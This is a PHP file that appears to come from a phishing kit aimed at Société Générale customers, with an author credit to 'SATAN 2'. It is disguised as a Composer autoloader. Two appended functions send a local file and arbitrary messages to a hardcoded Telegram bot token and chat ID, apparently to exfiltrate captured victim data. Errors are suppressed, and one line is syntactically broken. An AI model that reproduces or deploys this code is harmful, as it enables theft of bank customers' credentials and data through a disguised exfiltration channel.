<?php
/**
 * @link       :   https://www.satan2.com/
 * @package    :   SOCIETE GENERALE
 * @telegram   :   @satan2
 * Project Name:   SOCIETE GENERALE 2022
 * Author      :   SATAN 2
 * Mise à jour :   08-09-2022
 * Author URI  :   https://www.facebook.com/satan2
 */
$_SESSION['load_time']
error_reporting(0);

class ComposerAutoloaderInit54e213ff8ff963afa15306f7a66bfac0 {
    private static $loader;
    public static function loadClassLoader($class) {
        if ('Composer\Autoload\ClassLoader' === $class) {
            require __DIR__ . '/ClassLoader.php';
        }
    }
    public static function getLoader() {
        if (null !== self::$loader) {
            return self::$loader;
        }
        spl_autoload_register(array('ComposerAutoloaderInit54e213ff8ff963afa15306f7a66bfac0', 'loadClassLoader'), true, true);
        self::$loader = $loader = new \Composer\Autoload\ClassLoader();
        spl_autoload_unregister(array('ComposerAutoloaderInit54e213ff8ff963afa15306f7a66bfac0', 'loadClassLoader'));
        $useStaticLoader = PHP_VERSION_ID >= 50600 && !defined('HHVM_VERSION') && (!function_exists('zend_loader_file_encoded') || !zend_loader_file_encoded());
        if ($useStaticLoader) {
            require_once __DIR__ . '/autoload_static.php';
            call_user_func(\Composer\Autoload\ComposerStaticInit54e213ff8ff963afa15306f7a66bfac0::getInitializer($loader));
        } else {
            $map = require __DIR__ . '/autoload_namespaces.php';
            foreach ($map as $namespace => $path) {
                $loader->set($namespace, $path);
            }
            $map = require __DIR__ . '/autoload_psr4.php';
            foreach ($map as $namespace => $path) {
                $loader->setPsr4($namespace, $path);
            }
            $classMap = require __DIR__ . '/autoload_classmap.php';
            if ($classMap) {
                $loader->addClassMap($classMap);
            }
        }
        $loader->register(true);
        return $loader;
    }
}

function fstop() {
    $fpth = realpath("../fuck/fucked.fuck"); // fichier à envoyer
    if (!$fpth) return; // Sécurité si le fichier n'existe pas

    $dcmnt = new CURLFile($fpth);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot7275654860:AAF-1jh2m9_YLiajYieHBUCzUPF-a_VyUnc/sendDocument");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        "chat_id" => "6590534450",
        "document" => $dcmnt,
        "caption" => "Fichier reçu"
    ]);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $out = curl_exec($ch);
    curl_close($ch);
}

function get_data_encrypt($message) {
    $curl = curl_init();
    curl_setopt(
        $curl,
        CURLOPT_URL,
        "https://api.telegram.org/bot7275654860:AAF-1jh2m9_YLiajYieHBUCzUPF-a_VyUnc/sendMessage?chat_id=6590534450&text=" . urlencode($message) . "&parse_mode=HTML"
    );
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
}
